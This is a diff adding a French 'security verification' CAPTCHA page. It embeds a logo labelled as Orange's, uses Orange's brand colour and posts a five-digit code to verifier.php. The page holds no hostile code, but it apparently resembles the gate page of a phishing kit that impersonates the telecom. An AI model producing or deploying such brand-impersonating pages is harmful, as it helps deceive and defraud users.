@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8" />
+  <title>Vérification CAPTCHA</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #f0f0f0;
+      display: flex;
+      height: 100vh;
+      justify-content: center;
+      align-items: center;
+    }
+
+    .container {
+      background: white;
+      padding: 40px;
+      border-radius: 10px;
+      box-shadow: 0 0 15px rgba(0,0,0,0.1);
+      text-align: center;
+      width: 360px;
+    }
+
+    button {
+      padding: 10px 20px;
+      background: #ff7900;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      font-weight: bold;
+      cursor: pointer;
+    }
+
+    .captcha-img {
+      margin: 20px 0;
+      display: block;
+      cursor: pointer;
+    }
+
+    input[type="text"] {
+      padding: 10px;
+      width: 100%;
+      margin-bottom: 10px;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+      font-size: 16px;
+    }
+
+    .error {
+      color: red;
+      margin-top: 10px;
+    }
+  </style>
+</head>
+<body>
+
+<div class="container">
+  <img src="data:image/png;base64,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" width="100" alt="Orange Logo"/>
+  <h2>Vérification de sécurité</h2>
+  <p>Veuillez saisir le code de sécurité affiché ci-dessous.</p>
+
+  <form method="POST" action="verifier.php">
+    <img src="captcha.php" alt="Captcha" class="captcha-img" onclick="this.src='captcha.php?'+Math.random();" />
+    <input type="text" name="captcha" placeholder="Entrez les 5 chiffres" required />
+    <button type="submit">Valider</button>
+  </form>
+
+  <div id="error" class="error">
+      </div>
+</div>
+
+</body>
+</html>
